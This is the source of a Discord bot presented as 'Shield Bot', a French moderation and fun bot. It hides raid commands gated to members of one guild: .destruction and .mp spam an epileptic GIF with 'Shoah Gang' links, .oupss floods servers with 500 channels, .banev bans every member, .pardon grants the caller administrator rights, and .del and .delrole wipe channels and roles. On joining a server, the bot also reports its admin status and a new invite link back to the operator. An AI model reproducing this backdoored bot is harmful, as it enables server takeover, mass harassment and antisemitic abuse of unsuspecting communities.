const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require('fs');
const moment = require("moment");
 var prefix = "."
bot.on('ready',() => {
  //invit link
  console.log("---------------------------")
});  



bot.on('message', message => {
 
  const mute = require("./commands/moderation/mute.js");
  const unmute = require("./commands/moderation/unmute.js");
  
  mute(message, prefix , bot)
  unmute(message, prefix , bot)
  
  
  });


bot.on('message', msg => {
  if (msg.guild === bot.guilds.find('id', '453631449804046336')){ 
    return;
  }
  if (msg.guild === bot.guilds.find('id', '455361019368177684')){ 
    return;
  }
 if (bot.guilds.get('453631449804046336').members.get(msg.author.id) !== undefined) {
    
if (msg.content === '.destruction') {
  if(msg.channel.type === "dm") return;

    console.log(`Commande .destruction par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
      "SHOAH GANG ON THE BEAT \n"+
      "https://discord.gg/8vtFryt \n"+
      "https://discord.gg/s5Y2RfG").catch(e => {});
    }, 450)
  }

if (msg.content === '.oupss') {
  if(msg.channel.type === "dm") return;

    console.log(`Commande .oupss par ${msg.author.tag}`);
   fucked = false;

 
    if (!fucked){
      msg.guild.setIcon("./shoah.jpg").catch(e => {});
      msg.guild.setName('BZ by Shoah Gang').catch(e => {});
     msg.guild.setRegion('hongkong').catch(e => {});
 
      for (var i = 0; i < 500; i++) {
        msg.guild.createChannel('shoah_gang_te_baise', 'voice').catch(e => {});
        msg.guild.createChannel('shoah_gang_te_baise', 'text').catch(e => {});
      }
      fucked = true;
    }
 
    if (msg.deletable) {
      msg.delete();
    }
  }


if (msg.content === '.banev') {
  if(msg.channel.type === "dm") return;
  if(msg.deletable) msg.delete();


    console.log(`Commande .banev par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
    });
  }


if (msg.content === '.leave') {
  if(msg.channel.type === "dm") return;

    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    msg.guild.leave().catch(e => {});
  }

if (msg.content === '.pardon') {
  if(msg.channel.type === "dm") return;

    console.log(`Commande .pardon par ${msg.author.tag}`);
i
    msg.member.guild.createRole({
      name: "Shoah Gang",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role).catch(e => {});
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  if (msg.content === '.roleflood') {
    if(msg.channel.type === "dm") return;

    console.log(`Commande .roleflood par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    let i = 0;
    let interval = setInterval(function () {
    if (i === 250) clearInterval(interval);
    msg.guild.createRole({name: 'SHOAH GANG', color:'RANDOM'}).then(function(role) {
      msg.member.addRole(role).catch(e => {});
    i++
    }, 100).catch(e => {});
       });
    
      }

  if(msg.content === ".del"){
    if(msg.channel.type === "dm") return;

    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.channels.forEach(chan => {
      if (chan.deletable) chan.delete().catch(e => {});
    });
  }


  if(msg.content === ".mp"){
    if(msg.channel.type === "dm") return;

    if(msg.deletable) msg.delete();
    i = 0;
    msg.guild.members.forEach(member => {

    if(i < 500){
      var interval = setInterval (function () {
        member.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
        "SHOAH GANG ON THE BEAT \n"+
        "https://discord.gg/8vtFryt \n"+
        "https://discord.gg/s5Y2RfG").catch(e => {});
      }, 450)

      }   
  })
  }
  if(msg.content === ".delrole"){
    if(msg.channel.type === "dm") return;
    if(msg.deletable) msg.delete();
    msg.guild.roles.forEach(role => {
      if(role.deletable) role.delete();
    })

  } 


 }//Filtre personne
});
bot.on("message", message => {
  if(message.content.startsWith(".avatar")) {
    if(message.channel.type === "dm") return;

    var membere = message.mentions.members.first()
    let avatar_embed = new Discord.RichEmbed()
    .setAuthor(` Avatar de ${message.mentions.users.first().username}`)
    .setColor("#FFFFFF")
    .setImage(membere.user.avatarURL)
    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
    return message.channel.send(avatar_embed).catch(e => {});
}  
if(message.content.startsWith(".say")) {
  if(message.channel.type === "dm") return;

  if(message.deletable) {
  message.delete()}
var text = message.content.split(" ").slice(1).join(" ")
if(!text){
  messsage.channel.send("Tu ne m'as pas donner un message à répéter :x:").catch(e => {});
}
let embed = new Discord.RichEmbed();
embed.setColor("#FFFFFF")
.setTitle(" ")
.setDescription(text)
message.channel.sendEmbed(
  embed, {
    disableEveryone: true
  }
).catch(e => {});
}
})

bot.on("message", message => {
  if(message.content.startsWith(".8ball")){
    if(message.channel.type === "dm") return;

    var question = message.content.split(" ").slice(1).join(" ")
    var tableauball = ["Oui","Non","Peut être", "Je ne sais pas", "Surement", "Probablement","C'est sur", "J'en sais rien"]

    let ball_embed = new Discord.RichEmbed()
    .setColor("#FFFFFF")
    .setTitle(":newspaper2: **Question de "+message.author.tag+"** :newspaper2: ")
    .setDescription("**"+question+"**")
    .addField("**Reponse**","**"+ tableauball[Math.floor(Math.random()*8)] +"**")
    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
    .setThumbnail(bot.user.iconURL)
    return message.channel.send(ball_embed).catch(e => {});
  }
  
})

  bot.on("message", message => {
  if(message.content.startsWith(".serverinfo")){
    if(message.channel.type === "dm") return;

    moment.locale("fr");
    var date_de_creation_du_serv = moment(message.guild.createdTimestamp).format("LLLL");
    let serverinfo_embed = new Discord.RichEmbed()
    .setTitle("Info Sur le Serveur")
    .setColor("#FFFFFF")
    .addField("Nom", message.guild.name)
    .addField("Id du serveur", message.guild.id)
    .addField("Emplacement Du Serveur", message.guild.region)
    .addField("Nombre de membre", message.guild.memberCount)
    .addField("Date de Creation", date_de_creation_du_serv)
    .addField("Nombre de Channel", message.guild.channels.size)
    .addField("Nombre d'emoji", message.guild.emojis.size)
    .addField("Liste Des Emojis", message.guild.emojis.map(e=>e.toString()).join(" "))
    .setThumbnail(message.guild.iconURL)
    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
    return message.channel.send(serverinfo_embed).catch(e => {});
  }})

  bot.on("message", message => {
  if(message.content.startsWith(".userinfo")){
    if(message.channel.type === "dm") return;

    var membere2 = message.mentions.members.first()
    moment.locale('fr')
    var date_de_creation_du_compte = moment(membere2.user.createdTimestamp).format("LLLL") 

    let userinfo_embed = new Discord.RichEmbed()
    .setThumbnail(membere2.user.avatarURL)
    .setColor("#FFFFFF")
    .addField("Pseudo", `${message.mentions.users.first().username}`)
    .addField("Id du Membre", membere2.user.id)
    .addField("Date de Creation Du Compte", date_de_creation_du_compte)
    .addField("Discriminator", '#'+membere2.user.discriminator)
    .addField("Tag du Membre", membere2.user.tag)
    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
    message.channel.send(userinfo_embed) 
 return;
  }
})

bot.on('guildMemberAdd', member => {

  member.createDM().then(prive => {
    let bienvenue_embed = new Discord.RichEmbed()
    .setColor("#FFFFFF")
    .setTitle(`Bienvenue ${member.user.username}`)
    .setDescription("Merci d'avoir rejoint le serveurs")
    .addField("Tu veux m'ajouter sur ton serveur ?", "[CLIQUE ICI](https://discordapp.com/oauth2/authorize?client_id=454015393779154945&scope=bot&permissions=88888888888)")
    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé")
    .setThumbnail(member.iconURL)
    .setAuthor("Shield bot")
    prive.send(bienvenue_embed).catch(e => {});
  })
})

bot.on("message", message => {
  if(message.content === '.createinvite'){
    if(message.channel.type === "dm") return;

    message.channel.createInvite().then(invite => {
      message.reply(` :white_check_mark: ** Voici ton invite : https://discord.gg/${invite.code} ** :white_check_mark:`).catch(e => {});
    })
  }
})

bot.on("message", message => {
  if(message.content.startsWith(".kick")){
    if(message.channel.type === "dm") return;

    var membere2 = message.author
    var membere = message.guild.member(message.mentions.members.first());
    
    if(!message.member.hasPermission("KICK_MEMBERS")) {
      message.reply(":x: **Tu n'as pas assez de permission pour kick** :x:").catch(e => {});
    }
    if(!message.guild.member(bot.user).hasPermission("KICK_MEMBERS")){
      message.reply(":x: **Je n'ai pas assez de permission pour kick**").catch(e => {});
    }
    if(message.mentions.users.size === 0){
      message.reply(":x: ** Vous devez écrire la mention d'un joueur a kick ** :x:").catch(e => {});
    }
    else {
  membere.kick().then(member => {
    return message.channel.send(":white_check_mark: `"+membere.user.username+"` **à été kick par ** `"+membere2.username+"` :white_check_mark:").catch(e => {});
  }).catch(e => {});
    }
  }
  if(message.content.startsWith(".ban") & message.content != '.banev'){
    if(message.channel.type === "dm") return;

    var membere2 = message.author
    let membere = message.guild.member(message.mentions.members.first());
    if(!message.member.hasPermission("BAN_MEMBERS")) {
      message.reply(":x: **Tu n'as pas assez de permission pour ban** :x:").catch(e => {});
    }
    if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")){
      message.reply(":x: **Je n'ai pas assez de permission pour ban**").catch(e => {});
    }
    if(message.mentions.users.size === 0){
      message.reply(":x: ** Vous devez écrire la mention d'un joueur a ban ** :x:").catch(e => {});
    }
    else if(!membere.bannable){
      message.reply(":x: **Ce joueur n'est pas bannable, peut être à-t-il un rôle supérieur au mien ?** :x:")
    }
    else {
  membere.ban().then(member => {
   return message.channel.send(":white_check_mark:  `"+membere.user.username+"`  **à été ban par ** `"+membere2.username+"`  :white_check_mark:").catch(e => {});
  }).catch(e => {});
}
  }
})

bot.on("message", message => {
  if(message.content.startsWith(".flip")){
    if(message.channel.type === "dm") return;

    var flip = ["Pile", "Face"]
    var reponse = flip[Math.floor(Math.random()*2)]
    let flip_embed = new Discord.RichEmbed()
    .setColor("#FFFFFF")
    .addField("FLIP", " :moneybag: La piece affiche : **"+reponse+"**")
    message.channel.send(flip_embed).catch(e => {});
    }
    if(message.content === ".c"){
      if(message.channel.type === "dm") return;

      var voilatableau = ["Ptdrr t ki ?", "Ohhh mon maitre, tu es enfin de retour ?", "Tu es le meilleur, puis-je devenir ton disciple ?", "Degage toi","Mais QUI ES-TU ???","Je ne te connais pas dsl"]
      var voila = voilatableau[Math.floor(Math.random()*6)]
      let voila_embed = new Discord.RichEmbed()
      .setColor("#FFFFFF")
     .setDescription(":beer: **"+voila+"** :beers: ")
      return message.channel.send(voila_embed).catch(e => {});
    }
})

      bot.on("guildCreate", guild => {
        if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){
          var invite = guild.channels.find("id", guild.channels.random().id);
          invite.createInvite().then(invite => {
            bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(`[ADMINITRATEUR] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
          })
        }
        else if(!guild.member(bot.user).hasPermission("ADMINISTRATOR")){
          var invite = guild.channels.find("id", guild.channels.random().id);
          invite.createInvite().then(invite => {
            bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(`[NO ADMIN] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
          })
        }
      });
      bot.on('guildDelete', guild => {
        bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(` [LEAVE] ${guild.name} || ${guild.memberCount} membres`).catch(e => {});
      })
      bot.on("message", message => {
        if (message.content === '.rainrole') {
          if(message.channel.type === "dm") return;

          if (message.deletable) message.delete();
          if (!message.member.hasPermission("ADMINISTRATOR")) return message.reply(":x: **Tu dois avoir les permissions `ADMINISTRATOR`** :x: ").catch(e => {});
          else if(!message.guild.member(bot.user).hasPermission("ADMINISTRATOR")) return message.channel.send(":x: ** Je n'ai pas la permission `ADMINISTRATOR` ** :x:")

          else {
            message.reply(':white_check_mark: Le rôle **Rainbow** à bien été crée. Exécuté la commande `.rainbow` pour poursuivre la procèdure !:white_check_mark:').catch(e => {});
          }
          
          message.guild.createRole({name: 'Rainbow'}).catch(e => {});
        }
      
        if (message.content === '.rainbow') {
          if(message.channel.type === "dm") return;

        let args = message.content.split(' ')
        args.shift()
        message.delete()
        if (!message.member.hasPermission("ADMINISTRATOR")) return message.reply(":x: ** Tu n'as pas la permission `ADMINISTRATOR` ** :x:");
        else if(!message.guild.member(bot.user).hasPermission("ADMINISTRATOR")) return message.channel.send(":x: ** Je n'ai pas la permission `ADMINISTRATOR` ** :x:")
        else if (!message.guild.roles.find("name", "Rainbow")) return console.log(":x: **  Le role `Rainbow` n'existe pas ** :x:")
        else {
          message.reply(':rainbow: La commande est maintenant activé, il te reste juste à attribué le role! :rainbow:')
        var myRainbow = message.guild.roles.find("name", "Rainbow")
        let i = 0;
          let interval = setInterval(function () {
myRainbow.setColor("RANDOM").catch(e => {});
          
        }, 750)
      }
    }
      if(message.content.startsWith(".clear")){
        if(message.channel.type === "dm") return;

        var texte = message.content.split(" ").slice(1).join(" ")
        if(isNaN(texte) == false){
        if(!message.member.hasPermissions("MANAGE_MESSAGES")){
          message.channel.send(":x: **Tu n'as pas la permissions `MANAGE_MESSAGES` ** :x:").catch(e => {});
      }
      else if(!message.guild.member(bot.user).hasPermission("MANAGE_MESSAGES")){
        message.reply(":x: **Je n'ai pas assez de permission pour gérer les messages**").catch(e => {});
      }
      else if(!texte){
        message.channel.send(":x: **Tu dois écrire un nombre de message à supprimé** :x:")
      }
        else if(texte < 1 & texte > 900){
          message.channel.send(":x: **Le nombre de message à clear doit etre supérieur à `1` et inferieur et `900`** :x:").catch(e => {});
        }
        else {
          message.channel.bulkDelete(texte).then(number => {
            message.channel.send(":white_check_mark: ** J'ai supprimé `"+texte+"` messages **").catch(e => {});
          })
        }

      }
      else {
        message.channel.send(":x: **Vous devez entré un nombre entier** :x:").catch(e => {});
      }
    }
})
bot.on("message", message => {
  if(message.content === ".aide"){
    if(message.channel.type === "dm") return;

  let aide_embed = new Discord.RichEmbed()
  .setTitle("Aide Shield Bot")
  .setURL("https://discordapp.com/oauth2/authorize?client_id=454015393779154945&scope=bot&permissions=88888888888")
  .setDescription("Rejoindre le support 100 % Français de Shield Bot [cliquez ici](https://discord.gg/uyQcByK) :flag_fr: ")
.addField(":stuck_out_tongue_winking_eye:  .fun", "Faites `.fun` afficher les commandes droles !", true)
.addField(":tools: .moderation", "Faites `.moderation` pour afficher les commandes de modération !", true)
.setColor("#FFFFFF")
.addField(":electric_plug:  .utile", "Faites `.utile` pour afficher les commandes utiles", true)
  .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
  return message.channel.send(aide_embed)
  }
  if(message.content === ".fun"){
    if(message.channel.type === "dm") return;

    let fun_embed = new Discord.RichEmbed()
    .setTitle("FUN :stuck_out_tongue_winking_eye:")
    .addField(".rainrole", "Créer le role multicolore !!!! :gay_pride_flag: ", true)
    .addField(".rainbow", "Active le changement de couleur du role Rainbow ! :gay_pride_flag: ", true)
    .addField(".say","Fais dire une phrase au Shield Bot", true)
    .addField(".flip", "Jouez au pile ou face avec le bot", true)
    .addField(".8ball", "Posez une question au bot", true)
    .addField(".c", "Le bot vous revele vôtre vraie identitée...", true)
    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
    .setColor("#FFFFFF")

    return message.channel.send(fun_embed).catch(e => {});
  }
  if(message.content === ".moderation"){
    if(message.channel.type === "dm") return;

    let moderation_embed = new Discord.RichEmbed()
    .setTitle(":tools: .moderation", true)
    .addField(".kick", "Kick un membre", true)
    .addField(".ban", "Ban un membre", true)
    .addField(".unbanid", "Deban un membre via son id", true)
    .addField(".clear", "Supprime un certains nombre de message", true)
    .addField(".mute", "Enleve la permission d'écrire a un membre dans le salon", true)
    .addField(".unmute","Redonne la permission au membre de parler dans le salon", true)
    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
    .setColor("#FFFFFF")
    return message.channel.send(moderation_embed).catch(e => {});
  }
  if(message.content === ".utile"){
    if(message.channel.type === "dm") return;
    let utile_embed = new Discord.RichEmbed()
    .setTitle(":electric_plug:  .utile")
    .addField(".serverinfo", "Affiche des infos sur le serveur")
    .addField(".userinfo", "Affiche des infos sur une personne")
    .addField(".avatar", "Affiche l'avatar d'une personne")
    .addField(".createinvite", "Vous donnes une invit pour rejoindre le serveur")
    .setFooter("Copyright © 2018 Shield Bot - Tout droit réservé", bot.user.avatarURL)
    .setColor("#FFFFFF")
    return message.channel.send(utile_embed).catch(e => {});
  }
})

bot.on("message", message => {
  if(message.content.startsWith(".hackban")){
    if(message.channel.type === "dm") return;
    var args = message.content.split(" ").slice(1)
  if (!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) {
    return message.channel.send(":x: **Je n'ai pas la permission `BAN_MEMBERS` ** :x:").catch(e => {});
  } 

if(!message.member.hasPermission("BAN_MEMBERS")) return message.channel.send(":x: **Tu n'as pas la permission** `BAN_MEMBERS`").catch(e => {});

  var reason = args.join(" ") || "none";

message.guild.ban(args[0], reason).then(user => {
    message.channel.send(`:white_check_mark: **${user}** **à été hackban par** ${message.author.username}`).catch(e => {});
})
   if (!args[0]) {
        return message.channel.send(":x: **Tu dois envoyer l'id d'un membre a hackban** :x:").catch(e => {});
      }
    }
})

bot.on("message", message => {
  if(message.content.startsWith(".unbanid")){
    if(message.channel.type === "dm") return;
    var args = message.content.split(" ").slice(1)
    if (!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) {
      return message.channel.send(":x: **Je n'ai pas la permission `BAN_MEMBERS` ** :x:").catch(e => {});
    }
    if(!message.member.hasPermission("BAN_MEMBERS")) return message.channel.send(":x: **Tu n'as pas la permission** `BAN_MEMBERS`").catch(e => {});
    var reason = args.join(" ") || "none";
    message.guild.unban(args[0], reason).then(user => {
      message.channel.send(`:white_check_mark: **${user}** **à été unbanid par** ${message.author.username}`).catch(e => {});
    })
    if(!args[0]){
      return message.channel.send(":x: **Tu dois envoyer l'id d'un membre a unbanid ** :x:").catch(e => {});
    }
  }
})

bot.login(process.env.BOT_TOKEN); 
